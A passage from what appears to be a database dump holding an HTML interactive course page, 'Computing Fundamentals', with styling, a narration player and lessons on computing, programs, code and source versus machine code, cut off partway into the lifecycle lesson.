speakText(`Quiz complete! You scored ${score} out of ${quizData.length}, achieving a grade of ${grade}. ${msgs[grade][0]} ${msgs[grade][1]}`);\n}\n\nfunction restartQuiz() { initQuiz(); }\n\nfunction speakCurrentQuestion() {\n  if (currentQ < quizData.length) {\n    const q = quizData[currentQ];\n    speakText(q.q + ''. Options: A, '' + q.opts[0] + ''. B, '' + q.opts[1] + ''. C, '' + q.opts[2] + ''. D, '' + q.opts[3]);\n  }\n}\n\n// Init\nshowSection(''intro'', document.querySelector(''.sec-btn''));\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 6, 'Published', 1, '2026-03-08 01:38:22', '2026-03-10 09:54:09', NULL, NULL),
(14, 9, NULL, 'Computing Fundamentals', '', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Computing Fundamentals — Interactive Course</title>\n<style>\n@import url(''https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400;500&family=Outfit:wght@300;400;500;600;800&display=swap'');\n\n:root {\n  --bg: #fdf8f0;\n  --paper: #fff9f0;\n  --ink: #1a1208;\n  --ink2: #3d2e18;\n  --muted: #8a7560;\n  --accent: #e05c1a;\n  --accent2: #1a6ee0;\n  --accent3: #16a34a;\n  --gold: #c9920a;\n  --rule: rgba(26,18,8,0.12);\n  --card-bg: #fff;\n  --highlight: #fff3cd;\n  --shadow: 0 2px 16px rgba(26,18,8,0.1);\n  --shadow-lg: 0 8px 40px rgba(26,18,8,0.14);\n}\n\n*{margin:0;padding:0;box-sizing:border-box;}\n\nbody {\n  background: var(--bg);\n  color: var(--ink);\n  font-family: ''Outfit'', sans-serif;\n  min-height: 100vh;\n  background-image:\n    radial-gradient(ellipse at 10% 0%, rgba(224,92,26,0.07) 0%, transparent 60%),\n    radial-gradient(ellipse at 90% 100%, rgba(26,110,224,0.07) 0%, transparent 60%);\n}\n\n/* ── TOP BAR ── */\n.topbar {\n  position: sticky; top: 0; z-index: 300;\n  background: rgba(253,248,240,0.95);\n  backdrop-filter: blur(12px);\n  border-bottom: 2px solid var(--ink);\n  padding: 0 32px;\n  display: flex; align-items: stretch; justify-content: space-between;\n  height: 58px;\n}\n.brand {\n  display: flex; align-items: center; gap: 10px;\n  font-family: ''DM Serif Display'', serif;\n  font-size: 1.15rem; color: var(--ink);\n  letter-spacing: 0.3px;\n}\n.brand-dot { width:10px;height:10px;border-radius:50%;background:var(--accent);display:inline-block;}\n.prog-wrap {\n  display: flex; align-items: center; gap: 14px;\n}\n.prog-track {\n  width: 160px; height: 6px;\n  background: var(--rule); border-radius: 3px;\n  border: 1px solid rgba(26,18,8,0.15);\n}\n.prog-fill {\n  height: 100%; border-radius: 3px;\n  background: linear-gradient(90deg, var(--accent), var(--gold));\n  transition: width 0.5s ease;\n  width: 14%;\n}\n.prog-text { font-family:''DM Mono'',monospace; font-size:0.72rem; color:var(--muted); }\n\n/* ── HERO ── */\n.hero {\n  max-width: 860px; margin: 0 auto;\n  padding: 64px 32px 48px;\n  display: grid; grid-template-columns: 1fr auto;\n  gap: 32px; align-items: center;\n}\n.hero-left {}\n.hero-kicker {\n  font-family: ''DM Mono'', monospace;\n  font-size: 0.72rem; letter-spacing: 3px;\n  color: var(--accent); text-transform: uppercase;\n  margin-bottom: 14px;\n  display: flex; align-items: center; gap: 8px;\n}\n.hero-kicker::before { content:''''; display:block; width:28px; height:2px; background:var(--accent); }\n.hero h1 {\n  font-family: ''DM Serif Display'', serif;\n  font-size: clamp(2.4rem, 5vw, 3.8rem);\n  line-height: 1.08;\n  color: var(--ink);\n  margin-bottom: 16px;\n}\n.hero h1 em { color: var(--accent); font-style: italic; }\n.hero p { color: var(--muted); font-size: 1.05rem; line-height: 1.65; max-width: 480px; }\n.hero-badge {\n  background: var(--ink);\n  color: var(--bg);\n  border-radius: 14px;\n  padding: 20px 24px;\n  text-align: center;\n  min-width: 120px;\n}\n.hero-badge .num { font-family:''DM Serif Display'',serif; font-size:3rem; color:var(--accent); line-height:1; }\n.hero-badge .lbl { font-family:''DM Mono'',monospace; font-size:0.65rem; letter-spacing:2px; color:rgba(253,248,240,0.6); margin-top:4px; }\n\n/* ── NARRATION PLAYER ── */\n.narration-player {\n  max-width: 860px; margin: 0 auto 40px;\n  padding: 0 32px;\n}\n.player-inner {\n  background: var(--ink);\n  border-radius: 14px;\n  padding: 18px 24px;\n  display: flex; align-items: center; gap: 18px;\n  box-shadow: var(--shadow-lg);\n}\n.play-btn {\n  width: 46px; height: 46px; border-radius: 50%;\n  background: var(--accent); border: none;\n  color: #fff; font-size: 1.1rem;\n  cursor: pointer; flex-shrink:0;\n  display:flex; align-items:center; justify-content:center;\n  transition: all 0.2s;\n}\n.play-btn:hover { background: #c04a10; transform: scale(1.07); }\n.play-btn.active { background: var(--gold); animation: glow-pulse 1.4s infinite; }\n@keyframes glow-pulse {\n  0%,100%{box-shadow:0 0 0 0 rgba(201,146,10,0.4);}\n  50%{box-shadow:0 0 0 10px rgba(201,146,10,0);}\n}\n.player-text { flex:1; }\n.player-label { font-family:''DM Mono'',monospace; font-size:0.62rem; letter-spacing:2px; color:var(--accent); margin-bottom:4px; }\n.player-content { font-size:0.88rem; color:rgba(253,248,240,0.85); line-height:1.5; }\n.player-controls { display:flex; align-items:center; gap:8px; flex-shrink:0; }\n.spd-btn {\n  background: rgba(253,248,240,0.08);\n  border: 1px solid rgba(253,248,240,0.15);\n  color: rgba(253,248,240,0.7);\n  font-family:''DM Mono'',monospace; font-size:0.72rem;\n  padding: 6px 10px; border-radius:6px; cursor:pointer;\n  transition:all 0.2s;\n}\n.spd-btn:hover { background:rgba(253,248,240,0.16); color:#fff; }\n.spd-display { font-family:''DM Mono'',monospace; font-size:0.72rem; color:var(--gold); min-width:34px; text-align:center; }\n\n/* ── NAV TABS ── */\n.tab-nav {\n  max-width: 860px; margin: 0 auto 36px;\n  padding: 0 32px;\n  display: flex; flex-wrap:wrap; gap:8px;\n}\n.tab-btn {\n  font-family:''DM Mono'',monospace;\n  font-size:0.7rem; letter-spacing:1px;\n  padding: 8px 16px; border-radius: 8px;\n  border: 1.5px solid var(--rule);\n  background: transparent;\n  color: var(--muted); cursor: pointer;\n  transition: all 0.2s;\n  display:flex; align-items:center; gap:6px;\n}\n.tab-btn:hover { border-color:var(--accent); color:var(--accent); background:rgba(224,92,26,0.05); }\n.tab-btn.active { background:var(--ink); color:var(--bg); border-color:var(--ink); }\n.tab-num { opacity:0.5; }\n\n/* ── CONTENT ── */\n.content { max-width:860px; margin:0 auto; padding:0 32px 60px; }\n.lesson { display:none; animation:slideUp 0.35s ease; }\n.lesson.active { display:block; }\n@keyframes slideUp { from{opacity:0;transform:translateY(18px);} to{opacity:1;transform:none;} }\n\n/* Section header */\n.lesson-hd {\n  display: flex; align-items: flex-start; gap: 20px;\n  margin-bottom: 28px; padding-bottom: 20px;\n  border-bottom: 2px solid var(--rule);\n}\n.lesson-icon {\n  width: 60px; height: 60px; border-radius: 14px;\n  background: var(--ink); color: var(--bg);\n  display:flex; align-items:center; justify-content:center;\n  font-size: 1.8rem; flex-shrink:0;\n}\n.lesson-meta {}\n.lesson-tag { font-family:''DM Mono'',monospace; font-size:0.65rem; letter-spacing:2px; color:var(--accent); margin-bottom:6px; }\n.lesson-title { font-family:''DM Serif Display'',serif; font-size:1.9rem; color:var(--ink); line-height:1.1; }\n\n/* Definition block */\n.def-block {\n  background: var(--ink);\n  color: var(--bg);\n  border-radius: 14px; padding: 28px;\n  margin-bottom: 24px;\n  position: relative; overflow:hidden;\n}\n.def-block::before {\n  content:''"''; position:absolute; top:-10px; left:16px;\n  font-family:''DM Serif Display'',serif; font-size:7rem; color:rgba(253,248,240,0.05); line-height:1;\n}\n.def-label { font-family:''DM Mono'',monospace; font-size:0.65rem; letter-spacing:2px; color:var(--accent); margin-bottom:10px; }\n.def-text { font-family:''DM Serif Display'',serif; font-size:1.25rem; line-height:1.55; color:rgba(253,248,240,0.92); }\n\n/* Prose text */\n.prose { font-size:0.97rem; line-height:1.72; color:var(--ink2); margin-bottom:20px; }\n.prose strong { color:var(--ink); font-weight:600; }\n.prose .hl { background:rgba(224,92,26,0.12); padding:1px 5px; border-radius:3px; color:var(--accent); font-weight:500; }\n\n/* Cards */\n.card-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:14px; margin-bottom:24px; }\n.card {\n  background: var(--card-bg);\n  border: 1.5px solid var(--rule);\n  border-radius: 12px; padding:20px;\n  transition: all 0.22s;\n  position:relative;\n}\n.card:hover { border-color:var(--accent); transform:translateY(-3px); box-shadow:var(--shadow); }\n.card-accent { position:absolute; top:0; left:0; right:0; height:3px; border-radius:12px 12px 0 0; }\n.card-icon { font-size:1.8rem; margin-bottom:10px; }\n.card h3 { font-family:''Outfit'',sans-serif; font-size:0.95rem; font-weight:700; color:var(--ink); margin-bottom:7px; }\n.card p { font-size:0.85rem; color:var(--muted); line-height:1.55; }\n\n/* Compare boxes */\n.compare { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-bottom:24px; }\n.cmp {\n  border-radius:12px; padding:22px;\n  border:1.5px solid var(--rule);\n}\n.cmp.left { background:rgba(26,110,224,0.05); border-color:rgba(26,110,224,0.25); }\n.cmp.right { background:rgba(224,92,26,0.05); border-color:rgba(224,92,26,0.25); }\n.cmp-label { font-family:''DM Mono'',monospace; font-size:0.65rem; letter-spacing:2px; margin-bottom:8px; font-weight:600; }\n.cmp.left .cmp-label { color:var(--accent2); }\n.cmp.right .cmp-label { color:var(--accent); }\n.cmp h3 { font-size:1.05rem; font-weight:700; color:var(--ink); margin-bottom:10px; }\n.cmp ul { list-style:none; }\n.cmp ul li { font-size:0.87rem; color:var(--ink2); padding:4px 0; padding-left:16px; position:relative; line-height:1.45; }\n.cmp ul li::before { content:''→''; position:absolute; left:0; font-size:0.75rem; }\n.cmp.left ul li::before { color:var(--accent2); }\n.cmp.right ul li::before { color:var(--accent); }\n\n/* Steps / lifecycle */\n.steps { display:flex; flex-direction:column; gap:0; margin-bottom:24px; }\n.step {\n  display:flex; gap:20px; align-items:flex-start;\n  padding:18px 0;\n  border-bottom:1px solid var(--rule);\n  position:relative;\n}\n.step:last-child { border-bottom:none; }\n.step-num {\n  width:42px; height:42px; border-radius:50%;\n  background:var(--ink); color:var(--bg);\n  font-family:''DM Serif Display'',serif; font-size:1.1rem;\n  display:flex; align-items:center; justify-content:center;\n  flex-shrink:0;\n}\n.step-body {}\n.step-name { font-weight:700; font-size:1rem; color:var(--ink); margin-bottom:4px; display:flex; align-items:center; gap:8px; }\n.step-badge {\n  font-family:''DM Mono'',monospace; font-size:0.6rem; letter-spacing:1px;\n  padding:2px 8px; border-radius:4px; background:var(--accent); color:#fff;\n}\n.step p { font-size:0.87rem; color:var(--muted); line-height:1.5; }\n\n/* Code comparison */\n.code-compare { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-bottom:24px; }\n.code-box { border-radius:10px; overflow:hidden; border:1.5px solid var(--rule); }\n.code-box-header {\n  padding:10px 16px;\n  font-family:''DM Mono'',monospace; font-size:0.7rem; letter-spacing:1px;\n  display:flex; align-items:center; gap:8px;\n}\n.code-box.src .code-box-header { background:rgba(26,110,224,0.1); color:var(--accent2); border-bottom:1px solid rgba(26,110,224,0.2); }\n.code-box.mac .code-box-header { background:rgba(26,18,8,0.9); color:var(--accent); border-bottom:1px solid rgba(224,92,26,0.3); }\n.code-box pre {\n  padding:16px; font-family:''DM Mono'',monospace; font-size:0.82rem;\n  line-height:1.6; overflow-x:auto;\n}\n.code-box.src pre { background:rgba(26,110,224,0.04); color:var(--ink); }\n.code-box.mac pre { background:#111; color:#a8ff78; }\n.kw { color:var(--accent2); font-weight:500; }\n.str { color:var(--accent3); }\n.cm { color:var(--muted); font-style:italic; }\n\n/* Info callout */\n.callout {\n  border-left:4px solid var(--accent);\n  background:rgba(224,92,26,0.06);\n  border-radius:0 10px 10px 0;\n  padding:14px 18px; margin-bottom:20px;\n  font-size:0.9rem; line-height:1.55; color:var(--ink2);\n}\n.callout strong { color:var(--ink); }\n.callout.blue { border-color:var(--accent2); background:rgba(26,110,224,0.06); }\n.callout.green { border-color:var(--accent3); background:rgba(22,163,74,0.06); }\n\n/* Example box */\n.example {\n  background:var(--highlight);\n  border:1.5px dashed var(--gold);\n  border-radius:10px; padding:18px;\n  margin-bottom:20px;\n}\n.example-label { font-family:''DM Mono'',monospace; font-size:0.65rem; letter-spacing:2px; color:var(--gold); margin-bottom:8px; }\n.example p { font-size:0.9rem; color:var(--ink2); line-height:1.55; }\n\n/* ── QUIZ ── */\n.quiz-wrapper {\n  background: var(--card-bg);\n  border: 2px solid var(--ink);\n  border-radius: 16px; overflow:hidden;\n  margin-bottom:20px;\n}\n.quiz-hd {\n  background:var(--ink); padding:18px 24px;\n  display:flex; align-items:center; justify-content:space-between;\n}\n.quiz-hd h3 { font-family:''DM Serif Display'',serif; font-size:1.2rem; color:var(--bg); }\n.quiz-hd .q-count { font-family:''DM Mono'',monospace; font-size:0.7rem; color:rgba(253,248,240,0.5); }\n.quiz-body { padding:24px; }\n.q-progress-row { display:flex; gap:6px; margin-bottom:20px; }\n.q-dot { width:10px; height:10px; border-radius:50%; background:var(--rule); transition:all 0.3s; border:1.5px solid rgba(26,18,8,0.15); }\n.q-dot.done-right { background:var(--accent3); border-color:var(--accent3); }\n.q-dot.done-wrong { background:#e03e1a; border-color:#e03e1a; }\n.q-dot.current { background:var(--accent); border-color:var(--accent); box-shadow:0 0 0 3px rgba(224,92,26,0.2); }\n\n.q-text { font-size:1.05rem; font-weight:600; color:var(--ink); margin-bottom:18px; line-height:1.4; }\n.q-options { display:grid; gap:10px; }\n.q-opt {\n  padding:12px 16px; border-radius:9px;\n  border:1.5px solid var(--rule);\n  background:transparent; text-align:left;\n  font-family:''Outfit'',sans-serif; font-size:0.92rem;\n  color:var(--ink2); cursor:pointer;\n  display:flex; align-items:center; gap:12px;\n  transition:all 0.18s;\n}\n.q-opt:hover:not(:disabled) { border-color:var(--accent); background:rgba(224,92,26,0.05); color:var(--ink); }\n.q-opt.right { border-color:var(--accent3); background:rgba(22,163,74,0.08); color:var(--accent3); font-weight:600; }\n.q-opt.wrong { border-color:#e03e1a; background:rgba(224,62,26,0.07); color:#e03e1a; }\n.q-opt:disabled { cursor:default; }\n.opt-letter {\n  width:26px; height:26px; border-radius:6px;\n  border:1.5px solid currentColor;\n  display:flex; align-items:center; justify-content:center;\n  font-family:''DM Mono'',monospace; font-size:0.72rem;\n  flex-shrink:0; opacity:0.7;\n}\n.q-explain {\n  margin-top:14px; padding:12px 16px;\n  background:rgba(22,163,74,0.08);\n  border-left:3px solid var(--accent3);\n  border-radius:0 8px 8px 0;\n  font-size:0.87rem; color:var(--ink2); line-height:1.5;\n  display:none;\n}\n.q-explain.show { display:block; animation:slideUp 0.25s ease; }\n.quiz-footer {\n  padding:0 24px 20px;\n  display:flex; align-items:center; justify-content:space-between;\n}\n.quiz-score { font-family:''DM Mono'',monospace; font-size:0.78rem; color:var(--muted); }\n.quiz-score span { color:var(--accent); font-weight:600; font-size:1rem; }\n.next-btn {\n  background:var(--ink); color:var(--bg);\n  border:none; border-radius:8px;\n  font-family:''Outfit'',sans-serif; font-size:0.88rem; font-weight:600;\n  padding:10px 22px; cursor:pointer; transition:all 0.2s;\n  display:none;\n}\n.next-btn.show { display:block; }\n.next-btn:hover { background:var(--accent); }\n\n/* Result */\n.quiz-result {\n  text-align:center; padding:32px 24px;\n  display:none;\n}\n.quiz-result.show { display:block; animation:slideUp 0.4s ease; }\n.res-emoji { font-size:3.5rem; margin-bottom:12px; display:block; }\n.res-grade { font-family:''DM Serif Display'',serif; font-size:3rem; color:var(--accent); }\n.res-msg { font-size:1.1rem; font-weight:600; color:var(--ink); margin-bottom:6px; }\n.res-sub { color:var(--muted); font-size:0.9rem; margin-bottom:24px; }\n.res-stats { display:flex; justify-content:center; gap:20px; margin-bottom:24px; flex-wrap:wrap; }\n.res-stat { background:var(--bg); border:1.5px solid var(--rule); border-radius:10px; padding:14px 20px; min-width:90px; }\n.res-stat .v { font-family:''DM Serif Display'',serif; font-size:2rem; color:var(--ink); }\n.res-stat .k { font-family:''DM Mono'',monospace; font-size:0.6rem; letter-spacing:1px; color:var(--muted); }\n.retry-btn {\n  background:var(--accent); color:#fff; border:none;\n  border-radius:9px; padding:12px 28px;\n  font-family:''Outfit'',sans-serif; font-size:0.95rem; font-weight:700;\n  cursor:pointer; transition:all 0.2s;\n  margin-right:10px;\n}\n.retry-btn:hover { background:#c04a10; transform:translateY(-2px); }\n.outline-btn {\n  background:transparent; color:var(--ink);\n  border:1.5px solid var(--ink);\n  border-radius:9px; padding:12px 24px;\n  font-family:''Outfit'',sans-serif; font-size:0.92rem; font-weight:600;\n  cursor:pointer; transition:all 0.2s;\n}\n.outline-btn:hover { background:var(--ink); color:var(--bg); }\n\n/* Read aloud btn */\n.read-btn {\n  display:inline-flex; align-items:center; gap:8px;\n  background:rgba(224,92,26,0.08);\n  border:1.5px solid rgba(224,92,26,0.25);\n  border-radius:8px; padding:8px 16px;\n  font-family:''DM Mono'',monospace; font-size:0.72rem; letter-spacing:1px;\n  color:var(--accent); cursor:pointer; transition:all 0.2s;\n  margin-bottom:20px;\n}\n.read-btn:hover { background:rgba(224,92,26,0.15); }\n.read-btn.active { background:rgba(224,92,26,0.18); color:#c04a10; }\n\n/* Footer */\nfooter {\n  text-align:center; padding:24px;\n  font-family:''DM Mono'',monospace; font-size:0.68rem; color:var(--muted);\n  border-top:2px solid var(--ink);\n  margin-top:20px;\n}\n\n/* Responsive */\n@media(max-width:600px){\n  .hero{grid-template-columns:1fr; .hero-badge{display:none;}}\n  .compare,.code-compare{grid-template-columns:1fr;}\n  .topbar{padding:0 16px;}\n  .content,.tab-nav,.narration-player,.hero{padding-left:16px;padding-right:16px;}\n}\n</style>\n</head>\n<body>\n\n<!-- TOP BAR -->\n<div class="topbar">\n  <div class="brand"><span class="brand-dot"></span> Computing Fundamentals</div>\n  <div class="prog-wrap">\n    <div class="prog-track"><div class="prog-fill" id="progFill"></div></div>\n    <span class="prog-text" id="progTxt">1 / 7</span>\n  </div>\n</div>\n\n<!-- HERO -->\n<div class="hero">\n  <div class="hero-left">\n    <div class="hero-kicker">Interactive Course · CS Foundations</div>\n    <h1>Introduction to<br><em>Computing</em></h1>\n    <p>Explore core computing concepts — from what computing means to how programs are built and the difference between formal and natural languages.</p>\n  </div>\n  <div class="hero-badge">\n    <div class="num">7</div>\n    <div class="lbl">TOPICS</div>\n  </div>\n</div>\n\n<!-- NARRATION PLAYER -->\n<div class="narration-player">\n  <div class="player-inner">\n    <button class="play-btn" id="playBtn" onclick="togglePlay()" title="Play / Pause">▶</button>\n    <div class="player-text">\n      <div class="player-label">▸ VOICE NARRATION</div>\n      <div class="player-content" id="playerTxt">Select a topic and press play to hear its narration.</div>\n    </div>\n    <div class="player-controls">\n      <button class="spd-btn" onclick="adjRate(-0.25)">−</button>\n      <span class="spd-display" id="spdDisplay">1.0×</span>\n      <button class="spd-btn" onclick="adjRate(0.25)">+</button>\n    </div>\n  </div>\n</div>\n\n<!-- TABS -->\n<div class="tab-nav" id="tabNav">\n  <button class="tab-btn active" onclick="go(0,this)"><span class="tab-num">01</span> Computing</button>\n  <button class="tab-btn" onclick="go(1,this)"><span class="tab-num">02</span> Comp. Thinking</button>\n  <button class="tab-btn" onclick="go(2,this)"><span class="tab-num">03</span> Program</button>\n  <button class="tab-btn" onclick="go(3,this)"><span class="tab-num">04</span> Code</button>\n  <button class="tab-btn" onclick="go(4,this)"><span class="tab-num">05</span> Source vs Machine</button>\n  <button class="tab-btn" onclick="go(5,this)"><span class="tab-num">06</span> Lifecycle</button>\n  <button class="tab-btn" onclick="go(6,this)"><span class="tab-num">07</span> Formal vs Natural</button>\n</div>\n\n<!-- CONTENT -->\n<div class="content">\n\n  <!-- ══ LESSON 0: COMPUTING ══ -->\n  <div class="lesson active" id="l0">\n    <div class="lesson-hd">\n      <div class="lesson-icon">💻</div>\n      <div class="lesson-meta">\n        <div class="lesson-tag">TOPIC 01 — DEFINITION</div>\n        <div class="lesson-title">What is Computing?</div>\n      </div>\n    </div>\n    <button class="read-btn" onclick="readSection(0)">🔊 READ THIS TOPIC ALOUD</button>\n    <div class="def-block">\n      <div class="def-label">DEFINITION</div>\n      <div class="def-text">"Computing is the use of computers and computational processes to store, retrieve, transmit, and manipulate data in order to solve problems and perform tasks."</div>\n    </div>\n    <p class="prose">Computing is a broad discipline that encompasses everything from running a simple calculation on a calculator to training artificial intelligence. At its heart, computing involves giving a machine precise instructions and having it carry them out automatically.</p>\n    <div class="card-row">\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent)"></div>\n        <div class="card-icon">📥</div>\n        <h3>Input</h3>\n        <p>Data enters the system — from a keyboard, sensor, file, or network.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--gold)"></div>\n        <div class="card-icon">⚙️</div>\n        <h3>Processing</h3>\n        <p>The CPU executes instructions, performing arithmetic, logic, and control operations.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent2)"></div>\n        <div class="card-icon">📤</div>\n        <h3>Output</h3>\n        <p>Results are produced — displayed on screen, saved to disk, or sent over a network.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent3)"></div>\n        <div class="card-icon">💾</div>\n        <h3>Storage</h3>\n        <p>Data and programs are stored in memory or on disk for current and future use.</p>\n      </div>\n    </div>\n    <div class="callout">\n      <strong>Real-world examples of computing:</strong> Searching the web, streaming music, booking a flight, medical diagnosis, and self-driving cars all rely on computing.\n    </div>\n    <!-- MINI QUIZ -->\n    <div id="quiz0"></div>\n  </div>\n\n  <!-- ══ LESSON 1: COMPUTATIONAL THINKING ══ -->\n  <div class="lesson" id="l1">\n    <div class="lesson-hd">\n      <div class="lesson-icon">🧠</div>\n      <div class="lesson-meta">\n        <div class="lesson-tag">TOPIC 02 — DEFINITION</div>\n        <div class="lesson-title">Computational Thinking</div>\n      </div>\n    </div>\n    <button class="read-btn" onclick="readSection(1)">🔊 READ THIS TOPIC ALOUD</button>\n    <div class="def-block">\n      <div class="def-label">DEFINITION</div>\n      <div class="def-text">"Computational thinking is a problem-solving approach that involves breaking down complex problems into smaller parts and expressing solutions in a way that a computer could carry out."</div>\n    </div>\n    <p class="prose">Computational thinking is not just for programmers — it is a fundamental life skill. It means thinking clearly and logically about how to solve any problem, structured in a way that could be automated.</p>\n    <div class="card-row">\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent)"></div>\n        <div class="card-icon">🔪</div>\n        <h3>Decomposition</h3>\n        <p>Breaking a complex problem into smaller, manageable sub-problems that are easier to solve.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--gold)"></div>\n        <div class="card-icon">🔍</div>\n        <h3>Pattern Recognition</h3>\n        <p>Identifying similarities, trends, and patterns in problems to apply known solutions.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent2)"></div>\n        <div class="card-icon">🗂️</div>\n        <h3>Abstraction</h3>\n        <p>Focusing only on essential information and ignoring irrelevant details to simplify a problem.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent3)"></div>\n        <div class="card-icon">📋</div>\n        <h3>Algorithm Design</h3>\n        <p>Creating a precise, step-by-step set of instructions that solves the problem correctly.</p>\n      </div>\n    </div>\n    <div class="example">\n      <div class="example-label">✦ EVERYDAY EXAMPLE</div>\n      <p><strong>Making a sandwich</strong> uses all four pillars: Decompose the task (get bread, get filling, assemble). Recognise the pattern (same steps each time). Abstract the details (ignore the brand of bread). Design the algorithm (a step-by-step recipe).</p>\n    </div>\n    <div id="quiz1"></div>\n  </div>\n\n  <!-- ══ LESSON 2: PROGRAM ══ -->\n  <div class="lesson" id="l2">\n    <div class="lesson-hd">\n      <div class="lesson-icon">📄</div>\n      <div class="lesson-meta">\n        <div class="lesson-tag">TOPIC 03 — DEFINITION</div>\n        <div class="lesson-title">What is a Program?</div>\n      </div>\n    </div>\n    <button class="read-btn" onclick="readSection(2)">🔊 READ THIS TOPIC ALOUD</button>\n    <div class="def-block">\n      <div class="def-label">DEFINITION</div>\n      <div class="def-text">"A program is a set of instructions written in a programming language that a computer can execute to perform a specific task or solve a particular problem."</div>\n    </div>\n    <p class="prose">Think of a program as a <span class="hl">recipe for a computer</span>. Just as a recipe tells a chef exactly what to do step by step, a program tells the computer exactly what operations to perform and in what order.</p>\n    <div class="card-row">\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent)"></div>\n        <div class="card-icon">🎯</div>\n        <h3>Purpose</h3>\n        <p>Every program is designed to solve a specific problem — from displaying text to processing millions of transactions.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--gold)"></div>\n        <div class="card-icon">📝</div>\n        <h3>Instructions</h3>\n        <p>Programs consist of sequences of instructions: assignments, conditions, loops, and function calls.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent2)"></div>\n        <div class="card-icon">▶️</div>\n        <h3>Execution</h3>\n        <p>When a program runs, the CPU fetches and executes each instruction one at a time (or in parallel).</p>\n      </div>\n    </div>\n    <div class="callout blue">\n      <strong>Program vs Software:</strong> A single program is one set of instructions. Software often refers to a collection of programs working together — like the apps on your phone.\n    </div>\n    <div id="quiz2"></div>\n  </div>\n\n  <!-- ══ LESSON 3: CODE ══ -->\n  <div class="lesson" id="l3">\n    <div class="lesson-hd">\n      <div class="lesson-icon">{ }</div>\n      <div class="lesson-meta">\n        <div class="lesson-tag">TOPIC 04 — DEFINITION</div>\n        <div class="lesson-title">What is Code?</div>\n      </div>\n    </div>\n    <button class="read-btn" onclick="readSection(3)">🔊 READ THIS TOPIC ALOUD</button>\n    <div class="def-block">\n      <div class="def-label">DEFINITION</div>\n      <div class="def-text">"Code (or computer code) is the written text of a program — the actual symbols, words, and syntax that a programmer writes to instruct a computer."</div>\n    </div>\n    <p class="prose">Code is to a program what written words are to a story. A programmer writes code using a <span class="hl">programming language</span> — a precise, structured notation designed for communicating instructions to a machine.</p>\n    <div class="card-row">\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent)"></div>\n        <div class="card-icon">🐍</div>\n        <h3>High-Level Languages</h3>\n        <p>Python, Java, JavaScript — readable by humans, abstract away hardware details.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--accent2)"></div>\n        <div class="card-icon">⚡</div>\n        <h3>Low-Level Languages</h3>\n        <p>Assembly language — closer to hardware, faster but harder to write and read.</p>\n      </div>\n      <div class="card">\n        <div class="card-accent" style="background:var(--ink)"></div>\n        <div class="card-icon">🔢</div>\n        <h3>Machine Language</h3>\n        <p>Binary (0s and 1s) — the only language the CPU actually understands and executes.</p>\n      </div>\n    </div>\n    <div class="example">\n      <div class="example-label">✦ CODE IN ACTION</div>\n      <p>The code <code style="background:rgba(26,18,8,0.08);padding:2px 7px;border-radius:4px;font-family:''DM Mono'',monospace;font-size:0.88rem;">print("Hello, World!")</code> is a single line of Python code. It tells the computer to display the text "Hello, World!" on the screen. Simple and clear to a human; must be translated for the machine.</p>\n    </div>\n    <div id="quiz3"></div>\n  </div>\n\n  <!-- ══ LESSON 4: SOURCE vs MACHINE ══ -->\n  <div class="lesson" id="l4">\n    <div class="lesson-hd">\n      <div class="lesson-icon">⚙️</div>\n      <div class="lesson-meta">\n        <div class="lesson-tag">TOPIC 05 — DISTINCTION</div>\n        <div class="lesson-title">Source Code vs Machine Code</div>\n      </div>\n    </div>\n    <button class="read-btn" onclick="readSection(4)">🔊 READ THIS TOPIC ALOUD</button>\n    <div class="compare">\n      <div class="cmp left">\n        <div class="cmp-label">SOURCE CODE</div>\n        <h3>Human-Readable</h3>\n        <ul>\n          <li>Written by programmers in a high-level language</li>\n          <li>Uses meaningful words, symbols, and structure</li>\n          <li>Readable, editable, and maintainable</li>\n          <li>Must be translated before a CPU can run it</li>\n          <li>Example languages: Python, C++, Java</li>\n        </ul>\n      </div>\n      <div class="cmp right">\n        <div class="cmp-label">MACHINE CODE</div>\n        <h3>CPU-Readable</h3>\n        <ul>\n          <li>Binary instructions (0s and 1s) the CPU executes</li>\n          <li>Specific to the processor architecture</li>\n          <li>Not human-readable or easily editable</li>\n          <li>Generated by a compiler or interpreter</li>\n          <li>Executed directly by hardware at full speed</li>\n        </ul>\n      </div>\n    </div>\n    <div class="code-compare">\n      <div class="code-box src">\n        <div class="code-box-header">📝 SOURCE CODE (Python)</div>\n        <pre><span class="cm"># Calculate the square of a number</span>\n<span class="kw">def</span> square(n):\n    <span class="kw">return</span> n * n\n\nresult = square(<span class="str">5</span>)\n<span class="kw">print</span>(result)</pre>\n      </div>\n      <div class="code-box mac">\n        <div class="code-box-header">⚙ MACHINE CODE (binary)</div>\n        <pre>01001000 10001001 11100101\n10111000 00000101 00000000\n00001111 10101111 11000000\n10001001 01000101 11111000\n01011101 11000011 00000000</pre>\n      </div>\n    </div>\n    <div class="callout green">\n      <strong>How translation happens:</strong> A <strong>compiler</strong> translates the entire source code into machine code before execution (C, C++). An <strong>interpreter</strong> translates and executes line by line (Python). A <strong>JIT compiler</strong> does both dynamically (Java, JavaScript).\n    </div>\n    <div id="quiz4"></div>\n  </div>\n\n  <!-- ══ LESSON 5: LIFECYCLE ══ -->\n  <div class="lesson" id="l5">\n    <div class="lesson-hd">\n      <div class="lesson-icon">🔄</div>\n      <div class="lesson-meta">\n        <div class="lesson-tag">TOPIC 06 — PROCESS</div>\n        <div class="lesson-title">Program 